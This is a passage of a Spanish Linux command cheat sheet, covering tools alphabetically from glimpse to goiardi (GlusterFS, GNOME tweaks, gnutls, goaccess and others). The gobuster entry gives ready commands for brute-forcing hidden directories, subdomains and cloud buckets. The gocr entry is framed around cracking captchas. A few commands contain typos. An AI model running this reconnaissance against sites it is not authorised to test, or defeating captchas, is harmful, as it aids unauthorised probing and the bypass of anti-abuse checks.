[GLobal IMPlicit SEarch]. Es una herramienta de búsqueda de texto, diseñada para encontrar rápidamente cadenas en grandes cantidades de archivos. Las principales características son: Búsqueda muy rápida gracias a la indexación previa, soporte de expresiones regulares como grep, soporte para coincidencias aproximadas [fuzzy], operadores booleanos [AND, OR, NOT] y admite errores tipográficos o palabras mal escritas [tolerancia al error].
$ glimpseindex $HOME (indexar el directorio donde buscar, normalmente el $HOME y crea un archivo oculto .glimpse_index en ese directorio)
$ glimpseindex -o ~/indice_glimpse $HOME (lo mismo pero guardando los archivos generados en la indexación en ~/indice_glimpse)
$ glimpse -H ~/indice_glimpse "palabra" (busca "palabra" en los archivos indexados)
$ glimpse -H ~/indice_glimpse "error_[0-9]+" (busca patrones como error_123
$ glimpse -H ~/indice_glimpse -f "linux" 1 (busca "linux" permitiendo hasta 1 error tipográfico, como linus, linyx...)
$ glimpse -H ~/indice_glimpse "python AND programación" (busca archivos que contengan ambas palabras)
$ glimpse -H ~/indice_glimpse "error OR warning" (los busca con error o warning(
$ glimpse -H ~/indice_glimpse "important NOT test" (busca "important" pero excluye archivos con "test")
$ glimpse -H ~/indice_glimpse -i -w -n "linux OR debian" (busca linux o debian, insensible a mayúsculas, como palabras completas y mostrando números de línea)


glirc
es un cliente de consola IRC que se centra en proporcionar vistas dinámicas del modelo de tus conexiones IRC.
$ glirc (abrirá una ventana de consola donde podrás conectarte a servidores IRC y participar en canales)
$ glirc -s example.com -p 6697 (conectar a un servidor IRC específico)
$ glirc -s example.com -p 6697 -u sername -P password (conexión con autenticación)
Una vez conectado:
        /join #channelname (unirte a un canal)
        /say Hola, mundo! (enviar un mensaje a todos los usuarios en el canal actual)
        /quit (desconectarse del servidor)
        /nick newnickname (cambia nickname)
        /part (abandona el canal actual)
        /list (lista de canales disponibles)
        /whois nickname (información sobre un usuario específico)
También se puede crear o editar un archivo de configuración ~/.config/glirc/config para establecer opciones como el color del fondo, el tamaño de la ventana, etc.


global
Herramienta de búsqueda y exploración de código fuente. Genera una base de datos de símbolos [funciones, variables, macros, etc.] para permitir búsquedas rápidas.
$ cd ~/proyecto_c (ir al proyecto)
$ gtags (generar base de datos)
$ global -x printf (muestra dónde se define printf)
$ global -r malloc (muestra todas las llamadas a malloc)
$ global -f main.c (lista todos los símbolos en main.c)
$ global -x '^[A-Z]*_MAX$' (busca símbolos que coincidan con el patrón, por ejemplo INT_MAX)
$ htags (crea una interfaz web navegable del código accesible en ./HTML/)


glue-sprite
Herramienta para generar CSS de sprites [combinar múltiples imágenes pequeñas en una sola imagen más grande] utilizando cualquier tipo de imagen de origen, como PNG, JPEG o GIF. glue-sprite genera automáticamente el código CSS necesario para mostrar las porciones correctas del sprite en los elementos HTML. La salida genera dos archivos principales, un archivo de imagen PNG que contiene todas tus imágenes originales combinadas en un único sprite y un archivo CSS que contiene las clases CSS necesarias para utilizar el sprite. Cada clase CSS corresponderá a una de las imágenes originales y definirá la propiedad background-image para usar el sprite, así como las propiedades background-position para mostrar la porción correcta de la imagen y las dimensiones [width y height] de la imagen original.
$ glue-sprite -s dir_fotos/ -o dir_salida -css dir_salida/css/ (directorio de fotos, dir imagen grande i dir del archivo css generado)


glusterfs
[Gluster File System]. Es un sistema de archivos distribuido que permite agrupar múltiples dispositivos de almacenamiento, en nodos distintos, en un único sistema de archivos de red. Agrega varios bloques de almacenamiento mediante interconexión Infiniband RDMA o TCP/IP en un gran sistema de archivos de red paralelo. Gran parte del código se encuentra en el espacio de usuario y es fácilmente administrable.
# systemctl start glusterd (activa el servicio)
# systemctl enable glusterd
$ gluster volume list (mostrar todos los volúmenes)
$ gluster volume info volumen1 (información detallada de un volumen)
$ gluster volume status volumen1 (ver estado del volumen)
$ gluster volume add-brick volumen1 nodo3:/gluster/volumen1 (expandir un volumen [añadir un nuevo brick])
$ gluster volume stop volumen1 (parar un volumen)
$ gluster volume delete volumen1 (eliminar un volumen)
1.-
Ejemplo de Configuración Básica
Suponiendo dos nodos, nodo1 y nodo2, y se quiere crear un volumen replicado.
# gluster peer probe nodo2 (añadir el segundo nodo al clúster)
# gluster peer status (verificar los nodos conectados)
# mkdir -p /gluster/volumen1 (crear directorios "brick" en ambos nodos)
# gluster volume create volumen1 replica 2 transport tcp nodo1:/gluster/volumen1 nodo2:/gluster/volumen1 (crear un volumen GlusterFS replicado)
# gluster volume start volumen1 (activar el volumen)
Montar el volumen en un cliente. En un nodo cliente o en los mismos nodos:
# apt install glusterfs-client
# mkdir /mnt/volumen1
# mount -t glusterfs nodo1:/volumen1 /mnt/volumen1
Notas.-
       Brick: Directorio exportado por un nodo que forma parte del volumen GlusterFS.
       Volume: Conjunto lógico de bricks que se presenta como un solo sistema de archivos.
       Peer: Nodo dentro del clúster.
       Translator: Módulos que implementan funcionalidades (replicación, distribución, etc.).


glxinfo
Información sobre las bibliotecas gráficas.
$ glxinfo | grep  rendering  ("yes" indica que la tarjeta gráfica soporta aceleración 3D)
$ glxgears (Lo mismo en modo gráfico. Los engranajes  han de verse de forma decente)


glyphslib
Herramienta permite la conversión entre archivos fuente tipográfica Glyphs (.glyphs) y Objetos de Fuente Unificados [Unified Font Object - UFO]. El editor de fuentes Glyphs es una aplicación popular para macOS utilizada por diseñadores tipográficos profesionales y UFO es un formato abierto basado en XML que almacena datos de fuentes de manera que sea fácil de acceder y modificar.
$ glyphslib --output-dir=./output ./mifuente.glyphs (conversión de .glyphs a UFO)
$ glyphslib --output=mifuente.glyphs ./mifuente.ufo (conversión de UFO a .glyphs)
$ glyphslib --print ./mifuente.glyphs (visualizar información de un archivo .glyphs)
$ glyphslib --output-dir=./output --minimize-ufo-diffs ./mifuente.glyphs (conversión con opciones específicas)


glyphspkg
Conversor de archivos .glyphspackage [que contiene múltiples archivos, como glif, plist y otros, para representar una fuente] a .glyphs [formato de archivo único]. glyphspackage es un formato basado en directorios utilizado por la aplicación Glyphs para facilitar el control de versiones con sistemas como Git
$ glyphspkg MiFuente.glyphspackage (Se genera un archivo MiFuente.glyphs en el mismo directorio)
$ glyphspkg -o FuenteFinal.glyphs MiFuente.glyphspackage (crea un archivo FuenteFinal.glyphs en el directorio actual)
$ fontmake -g FuenteFinal.glyphs -o ttf (genera los archivos binarios de la fuente [.ttf o .otf])
$ fontmake -g MiFuente.glyphspackage -o ttf ((en versiones recientes de FontMake, se puede omitir el paso de glyphspkg y usar directamente))
Nota.- Desde las versiones recientes de FontMake, el soporte directo para .glyphspackage ha hecho que glyphspkg sea menos necesario, y el paquete ha sido marcado como "huérfano" en Debian, lo que indica que no recibe mantenimiento activo.


glyrc
Herramienta que utiliza la biblioteca libglyr para recuperar metadatos relacionados con la música de varios proveedores en línea como Amazon, Discogs y MusicBrainz. Se puede usar en reproductores multimedia para descargar carátulas, letras, biografías y mucho más.
$ glyrc artist -a "The Beatles" (obtener información de un artista)
$ glyrc album -a "Pink Floyd" -A "The Dark Side of the Moon" (obtener información de un álbum)
$ glyrc lyrics -a "Queen" -t "Bohemian Rhapsody" (obtener la letra de una canción)
$ glyrc cover -a "Michael Jackson" -A "Thriller" (obtener la carátula de un álbum)
$ glyrc biography -a "Bob Marley" (obtener la biografía de un artista)
$ glyrc song -a "Led Zeppelin" -t "Stairway to Heaven" (obtener información de una canción)


gmail
Correo de google. Permite buscar en el propio correo por palabras clave:
	From:usuario@correo.com (Muestra los recibidos de la dirección)
	To:usuario@correo.com (Muestra los enviados a la dirección)
	Subject:asunto(Busca correos relacionados con "asunto")
	label:etiqueta (busca los clasificados con la etiqueta)
	has:userlabels (lista los clasificados con la etiqueta creada por el usuario)
	has:nouserlabels (lista los clasificados con etiquetas puestas por gmail)
	has:attachment (buscar correos con adjuntos)
	has:attachment ppt (Buscar los que continen adjuntos con la extensión ppt)
	filename:nombre (Busca los que tengan nombre)
	lang:idioma (busca los escritos en un idioma concreto)
	After/Before:AAAA/MM/DD (buscar los posteriores o anteriores a una fecha. Formato: año/mes/día)
	/ (Coloca el cursor en la busqueda)
	? (Muestra los atajos de teclado)


gmetad
[Ganglia Meta-Daemon]. Es el demonio central del sistema de monitorización Ganglia. Su principal función es recopilar las métricas que envían los nodos individuales del clúster [donde se ejecuta el agente gmond], por defecto por el puerto 8649 y almacenarlas para su posterior visualización y análisis en archivos de Round Robin Database (RRD).
# systemctl start gmetad (iniciar el servicio gmetad)
# systemctl status gmetad (ver estado)
# gmetad -d 5 (indica el nivel de depuración, mayor número = más verbosidad)
1.-
Ejemplo de archivo de configuración
# nano /etc/ganglia/gmetad.conf
       data_source "mycluster" 192.168.1.10:8649 192.168.1.11:8649
       rrd_rootdir "/var/lib/ganglia/rrds"
       listen_port 8649
       xml_port 8651
data_source "mycluster" --> Define una fuente de datos llamada "mycluster" que recopilará métricas de los nodos con las direcciones IP 192.168.1.10 y 192.168.1.11 en el puerto 8649, el predeterminado
rrd_rootdir "/var/lib/ganglia/rrds" --> Especifica que las bases de datos RRD se almacenarán en el directorio /var/lib/ganglia/rrds.
listen_port 8649 --> Indica que gmetad escuchará las conexiones de gmond en el puerto 8649.
xml_port 8651 --> Define el puerto en el que gmetad servirá los datos en formato XML utilizado por ganglia-web.


gmime-bin
Biblioteca de creación y análisis de mensajes MIME [Multipurpose Internet Mail Extension] que son usados comúnmente en correos electrónicos para manejar contenidos como texto, HTML, archivos adjuntos, etc. Herramientas incluidas gmime-uuencode/gmime-uudecode [Herramientas para codificar y decodificar archivos usando el formato uuencode, que convierte archivos binarios en texto ASCII usado en algunos correos electrónicos antiguos]
$ gmime-uuencode archivo.txt > archivo.uu (codificar un archivo con gmime-uuencode)
$ gmime-uudecode archivo.uu (decodificar un archivo .uu con gmime-uudecode)


gmount
[google-docs-fs fuse]. Equivalente a mount pero para google docs. Ver tambien google gdrive.
$ gmount google_docs juan@gmail.com -d (sincronizar la carpeta google_docs con la cuenta y mostrando la salida. Pedirá contraseña)
$ gumount google_docs (Desmontar la carpeta)


gnokii
Herramienta que permite la comunicación con teléfonos móviles, principalmente modelos antiguos de Nokia y Symbian, mediante cables serie, USB, infrarrojos o Bluetooth. Su propósito es acceder a funciones del teléfono como la gestión de mensajes SMS, la agenda de contactos, el calendario, entre otros. Para consultar la lista de teléfonos compatibles: http://wiki.gnokii.org
Configurar el archivo con información sobre el modelo de teléfono y cómo está conectado, por ejemplo, USB, serie, Bluetooth.
$ nano ~/.config/gnokii/config
       [global]
        port = /dev/ttyUSB0
        model = AT
        connection = serial
        use_locking = yes
        serial_baudrate = 19200
Nota.- Si se usas Bluetooth, la configuración cambia: connection = bluetooth y port = xx:xx:xx:xx:xx:xx.
$ gnokii --identify (mostrará información del modelo de teléfono, versión de firmware, etc., si está correctamente conectado)
$ gnokii --sendsms +34123456789 (abrirá un prompt para enviar un SMS)
$ echo "Hola, este es un mensaje de prueba" | gnokii --sendsms +34123456789 (enviar un texto directamente)
$ gnokii --getsms IN 1 (lee el primer SMS de la bandeja de entrada [IN])
$ gnokii --getsms IN 1 end (leerá todos los mensajes desde el primero hasta el último disponible)
$ gnokii --getphonebook ME 1 end (recupera toda la agenda almacenada en la memoria del teléfono, ME = memoria interna, SM para SIM)
$ gnokii --getcalendar (sincronizar el calendario:)


gnome
Entorno de escritorio
# rm -rf .gnome .gnome2 .gconf .gconfd .metacity (Resetear la configuración)
$ gnome-open archivo.odt   (abrir un archivo con la aplicación asociada a ella por defecto)
$ gnome-open http://web.com   (lo mismo con una dirección web)
Ajustes
1.-
Suprimir rastro de los documentos e imagenes abiertas (lugares -> Documentos recientes):
$ rm .recently-used.xbel
$ mkdir .recently-user.xbel
También:
$ nano .gtkrc-2.0
Si no está se crea. Añadir la linea:
gtk-recent-files-max-age=0
2.-
Acciones sobre gnome y paneles
# killall gnome-panel (Matar el proceso)
# dpkg --purge --force-all gnome-panel gnome-panel-data (Desinstalar)
# apt-get install gnome-panel gnome-panel-data (instalar el panel)
# apt-get install --einstall gnome-panel gnome-panel-data (reinstalarlo)
# /etc/init.d/gdm restart (reiniciar gnome)
# gnome-panel & (lanzar la aplicación)
# pkg-reconfigure xserver-xorg (reconfigurar la seccion gráfica)
# apt-get remove gnome-desktop (desinstalar las X)
# apt-get install gnome-desktop (instalar las X)
# pgrep -lf gnome-panel | awk '{if ($2=="gnome-panel") print $1}' | xargs kill -9 (reiniciar los paneles)
3.-
Carpetas por defecto que aparecen en el directorio /home
$ cat .config/user-dirs.dirs | grep ^XDG
XDG_DESKTOP_DIR="$HOME/Escriptori"
XDG_DOWNLOAD_DIR="$HOME/Baixades"
XDG_TEMPLATES_DIR="$HOME/"
XDG_PUBLICSHARE_DIR="$HOME/Públic"
XDG_DOCUMENTS_DIR="$HOME/Documents"
XDG_MUSIC_DIR="$HOME/Música"
XDG_PICTURES_DIR="$HOME/Imatges"
XDG_VIDEOS_DIR="$HOME/Vídeos"
Para modificarlas editar el archivo:  nano .config/user-dirs.dirs y, si por ejemplo, tenemos las imágenes en /media/sda5/imatges con su entrada en /etc/fstab  Auto, dejamos la entrada correspondiente:
XDG_PICTURES_DIR="/media/sda5/imatges"
Atajos escritorio
	Ctrl+o (Abre la carpeta personal o la del documento abierto)
	Ctrl+Alt+tecla de cursor (Cambia el espacio de trabajo)
	Ctrl+Alt+backspace (Reiniciar entorno gráfico si está activado)
	F1 (Muestra la Ayuda)
	F11 (Pantalla completa)
	Alt+Inicio (Abre la carpeta personal)
	Alt+ImprPant (Realiza una captura de la ventana actual)
	Alt+F1 (Abre el menú aplicaciones)
	Alt+F2 (Abre el cuadro lanzar aplicaciones)
	Alt+F4 (Cierra la ventana activa)
	Alt+F7 (Mueve ventana con las teclas de cursor. Para finalizar pulsar tecla)
	Alt+F8 (Cambia tamaño de ventana con teclas de cursor. finalizar pulsar tecla)
	Alt+F9 (Minimiza)
	Alt+F10 (Maximiza)
	Alt+Ctrl+Shift+teclas de cursor (Mueve la ventana activa a otra área de trabajo)


gnome-keyring
Demonio para gestionar de manera segura las credenciales de acceso del usuario, como los nombre de usuario y las contraseñas. Usando algunos escritorios la consola puede mostrar el error:
WARNING: gnome-keyring:: couldn't connect to: /home/USER/.cache/keyring-s1KHzb/pkcs11: El fichero o directorio no existe
Para resolverlo:
# nano /etc/xdg/autostart/gnome-keyring-pkcs11.desktop
Buscar la linea:
OnlyShowIn=GNOME;Unity;
Y añadir el escritorio usado:
OnlyShowIn=GNOME;Unity;LXDE;Xfce
Reiniciar


gnome-screensaver-command
Herramienta de control del salvapantallas
$ gnome-screensaver-command -l (Bloqueo inmediato)
Opciones
	--exit (Salir de salvapantalla)
	-q (Consulta el estado de la pantalla)
	-t (Tiempo para que entre en acción)
	-a (Activarlo)
	-d (Desactivarlo)


gnome-screenshot
Capturar la pantalla, una ventana o un área definida por el usuario y guardar la imagen instantánea en un archivo.
$ gnome-screenshot -B -w -t captura.png (sin bordes, de la terminal activa y con el nombre mencionado)
$ gnome-screenshot -d 2 -f captura.png (después de pulsar intro, 2 segundos para la captura)
$ gnome-screenshot -b -p -d 3 -f captura.png (con bordes, con el puntero, 3 segundos para la captura y guardada como captura.png)
$ gnome-screenshot -a -f captura.png (el puntero se convierte en una cruz para marcar el area de la captura)


gnome-terminal
Emulador de terminal de gnome.
$ gnome-terminal --hide-menubar --geometry=200x70+0+0 -e "sh -c 'links2 http://google.es'"& (arrancar una terminal, sin menús, con unas medidas concretas y en ella, arrancar el navegador)
Opciones:
	--window-with-profile=perfil2  (especificar un perfil para arrancar)
	--show-menubar  (Mostrar los menús)
	--maximize (maximizada)
	--full-screen (a pantalla completa)
	--zoom=x.x (factor de ampliación de la terminal [--zoom=1.0 medida normal])
atajos:
	Ctrl + a (lleva el cursor al principio de la línea)
	Ctrl + b (Retrocede un carácter)
	Ctrl + c (mata lo que se está escribiendo y devuelve el prompt)
	Ctrl + d (Sale de root y si está como usuario, cierra la terminal)
	Ctrl + e (lleva el cursor al final de la línea)
	Ctrl + f (adelanta un caracter)
	Ctrl + k (Borra de la posición actual al final de la linea)
	Ctrl + l (limpia la pantalla)
	Ctrl + r (Buscar en el historial de comandos. “Esc” editar. “Ctrl +g” abortar “Intro” ejecutar)
	Ctrl + t (Intercambiar las dos letras anteriores al cursor [pieran → pierna])
	Ctrl + u (Borra de la posición actual al principio de la linea)
	Ctrl + w (borra del cursor al primer espacio hacia el principio de la linea)
	Ctrl + y (Deshace la última acción)
	Ctrl + Mayu + t (Abrir nueva pestaña)
	Ctrl + Mayu + w (Cerrar pestaña)
	Esc + d (Borra de la posición actual al final de la palabra)
	Esc + b (Ir una palabra hacia atras)
	Esc + f (Ir una palabra hacia adelante)
	Esc + t (Intercambiar las dos palabras anteriores al cursor [sin tos → tos sin])
	Mayús+RePág (Hace scroll de la terminal hacia arriba)
	Mayús+AvPág (Hace scroll de la terminal hacia abajo)
1.-
Cambiar las medidas por defecto de la terminal:
# nano /usr/share/vte/termcap/xterm
Buscar la linea:
co#80:it#8:li#24:\
Y modificar los parámetros co (columnas) y li (lineas) con las nuevas medidas: co#100:it#8:li#10:\


gnu-standards
Consta de dos documentos del proyecto GNU: «Estándares de codificación de GNU» [/usr/share/doc/gnu-standards/standards.html] e «Información para los mantenedores de software de GNU» [/usr/share/doc/gnu-standards/maintain.html].


gnu-which
Utilidad para mostrar la ruta completa de los comandos.
$ which.gnu ip


gnuhtml2latex
Script de Perl que convierte archivos HTML a LaTeX. Toma una lista de archivos .html como argumentos y los convierte en .tex.
$ gnuhtml2latex archivo.html


gnupg
[GNU Privacy Guard]. Herramienta de GNU, que implementa el estándar Internet OpenPGP [RFC 4880] sustituto gratuito de PGP [Pretty Good Privacy], que permite cifrar y descifrar datos de mensajes o archivos, firmar y verificar firmas digitales y generar y gestionar claves criptográficas. Ver pgp.


gnuplot
Programa muy flexible para generar gráficas de funciones y datos.
$ gnuplot (Entrar en el promp de gnuplot)
Una vez en el prompt de la aplicación mostrará de forma gráfica los siguientes datos entrados:
gnuplot> help plot (información)
gnuplot> help functions (funcioones soportadas)
gnuplot> plot sin(x)*cos(x/3)
gnuplot> plot sin(x)*cos(x/3), x/2
gnuplot> plot [-10:10] sin(x), atan(x), cos(atan(x))
	gnuplot> set title "Funciones" (establecer nombre de la gráfica)
	gnuplot> set xlabel "x [grados]" (establecer nombre para las coordenadas)
	gnuplot> set ylabel "y(x)"
	gnuplot> plot [-pi:pi] sin(x) title "sen(x)" with linespoints linetype 4 linewidth 3, atan(x), cos(atan(x))
Otro ejemplo en 3D:
	gnuplot> set xrange [-2:2]
	gnuplot> set yrange [-2:2]
	gnuplot> splot exp(-x * x) * exp(-y * y)
Otro ejemplo a partir de un archivo [en el mismo directorio o especificando la ruta]
	$ cat datos (un archivo con 4 columnas de numeros fraccionales)
	0.10 1.12 23.45 11.11
	0.20 2.12 12.34 22.22
	0.30 2.34 98.23 10.40
	$ gnuplot (entrar en el prompt)
	gnuplot> plot "datos" using 1:2 with lines


gnustep-base-runtime
Demonios y herramientas para las aplicaciones desarrolladas con la biblioteca base de GNUstep. La biblioteca base de GNUstep es una implementación libre y de código abierto de las bibliotecas de objetos fundamentales de Cocoa, el framework de desarrollo de aplicaciones nativo de macOS y su objetivo principal es permitir el desarrollo de aplicaciones portables que puedan ejecutarse en diferentes sistemas operativos, como Linux, Windows, macOS, etc. sin necesidad de modificar el código fuente significativamente. Incluye las aplicaciones HTMLLinker, autogsdoc, cvtenc, defaults, gdnc, gdomap, gspath, make_strings, pl, pl2link, pldes, plget, plmerge, plparse, plser, plutil, sfparse y xmlparse.
$ HTMLLinker -o MiAplicacion.help MiDocumentacion.html OtroDocumento.html (crearía un paquete de ayuda llamado a partir de los archivos HTML proporcionados)
$ autogsdoc -o Documentacion.texi *.h (generaría un archivo Texinfo [Documentacion.texi] con la documentación extraída de todos los archivos de encabezado en el directorio actual)
$ cvtenc -f ISO-8859-1 -t UTF-8 archivo_antiguo.txt > archivo_nuevo.txt (convertir un archivo de texto codificado en ISO-8859-1 a UTF-8 [archivo_nuevo.txt])
$ defaults read com.example.MiAplicacion NombreUsuario (leer la configuración de una aplicación con el identificador com.example.MiAplicacion para la clave NombreUsuario)


gnutls-bin
Interfaz de línea de comandos para la biblioteca GNU TLS [Transport Layer Security], que permite configurar conexiones seguras, depurar problemas de conexión o gestionar certificados. Incluye las herramientas certtool, danetool, gnutls-cli, gnutls-cli-debug, gnutls-serv, ocsptool, p11tool, psktool, srptool
$ gnutls-cli google.com (establecer conexion TLS)
$ gnutls-cli -p 443 example.com (establecer conexion TLS por un puerto especifico)
$ gnutls-cli --x509cafile /etc/ssl/certs/ca-certificates.crt example.com (con verificación del certificado)
$ gnutls-cli-debug -p 443 example.com (prueba qué características TLS soporta un servidor. Muestra protocolos y cifrados soportados, si el servidor permite renegociación insegura, etc.)
$ gnutls-serv --x509certfile=cert.pem --x509keyfile=key.pem --port=5556 (servidor TLS para pruebas.Levantar un servidor TLS en el puerto 5556 usando los certificados proporcionados)
$ certtool --generate-privkey --outfile key.pem (generar una clave privada)
$ certtool --generate-request --load-privkey key.pem --outfile request.csr (crear una CSR [solicitud de certificado])
$ certtool --generate-self-signed --load-privkey key.pem --outfile cert.pem --template info.txt (crear un certificado autofirmado)
$ psktool -u usuario -p psk.txt (crear claves precompartidas [PSK] para autenticación TLS)
$ srptool --create-conf --username=usuario --password=secreto --passwd-conf=srp.conf (genera credenciales SRP [Secure Remote Password] para autenticación TLS)
$ danetool --create-tlsa --host example.com --port 443 --proto tcp (extraer un registro TLSA)
$ ocsptool --ask --load-cert cert.pem --load-issuer issuer.pem --outfile ocsp.out (verifica certificados mediante OCSP [Online Certificate Status Protocol])
$ p11tool --list-tokens (listar tokens disponibles)
$ p11tool --login --list-all --provider=/usr/lib/softhsm/libsofthsm2.so (listar objetos en un token)


go
Lenguaje de programación, útil para la instalación de aplicaciones en sistemas linux. Instalación en Debian:
$ cd /tmp
$ wget https://golang.org/dl/go1.20.2.linux-amd64.tar.gz
$ sudo tar -C /usr/local -xzf go1.20.2.linux-amd64.tar.gz
$ echo "export PATH=/usr/local/go/bin:${PATH}" | sudo tee -a $HOME/.profile
$ source $HOME/.profile
$ go version
1.-
Un ejemplo de instalación de una aplicación usando el comando go
# go install github.com/42wim/dt@latest
# cp ~/go/bin/dt /usr/bin/ (para estar disponible como cualquier comando)


go2
Buscador de directorios. En Ubuntu es necesario hacer el “--setup”.
$ go2 images (Mostrará una lista de todos los directorios “images” del directorio personal precedidos de una letra [a, b, c...] al pulsarla, entraremos directamente en el directorio especificado)
$ go2 -r carpeta (Busca desde el directorio raiz)
$ go2 -l carpeta (Hace la búsqueda pero sólo muestra el resultado saliendo al acabar dicha búsqueda)
$ /usr/lib/go2/go2.sh --setup (configura nuestro .bashrc para poder llamar al comando con go2 simplemente)


goaccess
Herramienta de análisis de logs en tiempo real que permite visualizar estadísticas de tráfico web de forma interactiva. Es compatible con varios formatos de logs, incluyendo Apache, Nginx, CloudFront y otros.
$ goaccess /var/log/apache2/access.log (analiza el archivo de log predeterminado de Apache con interfaz de terminal)
$ goaccess /var/log/nginx/access.log --log-format=COMBINED (especificar formato del log. "COMBINED" es el formato estándar de Apache/Nginx. Otros formatos: VCOMMON, CLOUDFRONT, etc)
$ goaccess /var/log/apache2/access.log -o report.html --log-format=COMBINED (crea un informe en HTML que se puede abrir en un navegador)
$ tail -f /var/log/nginx/access.log | goaccess - (muestra estadísticas en tiempo real)
$ goaccess /var/log/apache2/access.log --date-format='%d/%b/%Y' --time-format='%H:%M:%S' (ajusta el formato de fecha/hora según el log)
$ zcat /var/log/apache2/access.log.*.gz | goaccess (procesar logs comprimidos)
# goaccess /var/log/apache2/access.log -o /var/www/html/report.html --real-time-html (interfaz en el navegador: http://localhost/report.html)
Nota.- antes descomentar time-format y date-format en el archivo /etc/goaccess/goaccess.conf.


gobrowser
[golang git-core]Administrador de archivos basado en Web.
Instalación:
	# cd /opt
	# git clone https://github.com/xataz/gobrowser.git
	# cd gobrowser
	# go build app.go
Configuración:
$ nano app.conf
Y añadir:
	{
		"listen": ":6001", # Puerto de escucha
		"webroot": "/files", # Si queremos añadir /files para acceder via http://URL:6001/files. En caso contrario dejar vacio ("")
		"path": "/var/www/html/compartido", # Ruta al repositorio de archivos
		"hiddenfile": false # Si no queremos listar lo acultos. "true" para incluirlos
	}
$ ./app (Arrancar el servidor)
2017/04/05 15:14:08 Configfile found !!!
2017/04/05 15:14:08 Starting goBrowser on :6001


gobuster
Herramienta que permite realizar ataques de fuerza bruta para detección de directorios, archivos y DNS contra URIs en sitios web, subdominios DNS, nombres de host virtuales en servidores web de destino, buckets de Open Amazon S3, buckets de Open Google Cloud y servidores TFTP.
$ gobuster dir -u https://ejemplo.com -w /usr/share/wordlists/dirb/common.txt (descubrir directorios y archivos ocultos en un sitio web y ruta al diccionario)
$ gobuster dir -u https://ejemplo.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt -o resultados.txt (con 50 hilos, por defecto 10, extensiones a buscar y archivo para guardar resultados)
$ gobuster dns -d ejemplo.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt (descubrir subdominios mediante fuerza bruta en un domínio objetivo)
$ gobuster vhost -u https://ejemplo.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt (descubrir hosts virtuales en un servidor web)
$ gobuster s3 -w wordlist.txt (enumerar buckets de Amazon S3)
$ gobuster gcs -w wordlist.txt (enumerar buckets de Google Cloud Storage)
$ gobuster tftp -u 192.168.1.10 -w wordlist.txt ((descubrir archivos en servidores TFTP)
$ gobuster dir -u https://ejemplo.com -w wordlist.txt -s "200,204,301,302,307" -b "403,404" (-s para mostrar solo estos códigos de estado y excluir los especificados en -b)
$ gobuster dir -u https://ejemplo.com -w wordlist.txt -U usuario -P contraseña (uso con autenticación básica)
$ gobuster dir -u https://ejemplo.com -w wordlist.txt -k -c "cert.pem" (búsqueda con certificados personalizados. -k para ignorar verificación SSL y -c con certificado personalizado)
$ gobuster dir -u https://ejemplo.com -w wordlist.txt -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" (con user-agent personalizado)


goby
Herramienta de presentación WYSIWYG [What You See Is What You Get - lo que ves es lo que obtienes] para dentro del entorno Emacs. Goby es un paquete de Emacs Lisp para mostrar fuentes e imágenes de gran tamaño que puede utilizarse como herramienta de presentación WYSIWYG en GNU Emacs y ofrece dos modos: Edición y Vista. El modo Edición se implementa como modo secundario, mientras que el modo Vista es principal. El archivo creado (*.gby) es solo texto, por lo que se puede gestionar fácilmente. Para mostrar fuentes de gran tamaño, instale los paquetes de fuentes TrueType/OpenType. Para usar imágenes, instale el paquete netpbm. Para crear capturas de pantalla, instale el paquete imagemagick.
Ejemplo de presentación:
$ nano presentacion.goby
        ;;; -*- goby-presentation -*-
        ;; -*- mode: goby; -*-
        * Título de la Presentación
        ;
        ** Introducción
           Esta es la primera diapositiva.
        ;
        ** Tema 1
           Aquí se puede hablar sobre el tema 1.
           se puede usar listas:
           - Punto uno
           - Punto dos
        ;
        ** Imagen
           [image: /ruta/a/la/imagen.png]
        ;
        ** Fin
           ¡Gracias!
Abrir el archivo en Emacs y si goby no se activa automaticamente, activarlo con:
        M-x goby-mode
Para ver la presentación:
        M-x goby-view-mode
Parar la presentación con.
        M-x goby-view-quit
Volver al modo edición:
        M-x goby-edit-mode
Navegar por las diapositivas:
    n o flecha derecha: siguiente diapositiva
    p o flecha izquierda: diapositiva anterior
    q: salir de la vista


gocr
programa que imprime en la salida estándar todo el texto que puede leer de cualquier fichero gráfico de entrada. Usado especialmente para el descifrado de kapchas. El programa necesita cierto aprendizaje.
$ mkdir ocrdb
$ gocr -d 2 -p ./ocrdb/ -m 256 -m 130 kapcha.jpg (El aprendizaje. Lanzar varias veces)
$ gocr -p ocrdb/ -m 2 kapcha.jpg (Comprobar si el programa lo resuelve solo)


gocryptfs
Cifrado de archivos en un directorio que se puede montar. Cada archivo almacena un archivo cifrado correspondiente en el disco duro.
$ mkdir dir_cifrado lugar (Crear directorios, el cifrado y donde se montará [lugar])
$ gocryptfs -init dir_cifrado (Iniciar el proceso. Pedirá contraseña y confirmación)
$ gocryptfs dir_cifrado lugar (montar dir_cifrado en "lugar")
$ touch lugar/archivo.txt (crear un archivo en el dir montado)
$ fusermount -u lugar (desmontar el directorio montado)
$ gocryptfs -passwd dir_cifrado (modificar la contraseña. Primero pide la antigua y luego la nueva y confirmación)
$ gocryptfs -fsck dir_cifrat (chequear la consitencia del directorio cifrado [fsck summary: no problems found])


goiardi
Implementación del servidor Chef escrita en Go que puede ejecutarse completamente en memoria, con la opción de guardar y cargar los datos y buscar índices en disco, inspirándose en Chef-Zero y compatible con las herramientas habituales del ecosistema Chef, como knife y chef-client, o utilizando bases de datos como MariaDB/MySQL o PostgreSQL como backend de almacenamiento. Archivo de configuración en /etc/goiardi/goiardi.conf
$ goiardi --ipaddress="0.0.0.0" --port=4545 --data-file=/var/lib/goiardi/data.bin --index-file=/var/lib/goiardi/index.bin (inicia en modo memoria [in-memory] escuchando en todas las interfaces por el puerto 4545, y guarda los datos e índices en disco para persistencia entre reinicios)
$ goiardi --ipaddress="0.0.0.0" --port=4545 --use-mysql --mysql-username=USER --mysql-password=PASS --mysql-address=localhost --mysql-dbname=BASE_DATOS (almacena todos los datos en una base MySQL en vez de en memoria. Es necesario tener la base y el usuario creados previamente)
$ goiardi --ipaddress="0.0.0.0" --port=4545 --use-postgresql --postgresql-username=USER --postgresql-password=PASS --postgresql-address=localhost --postgresql-dbname=BASE_DATOS (modo similar al ejemplo anterior, pero usando PostgreSQL como backend de almacenamiento)
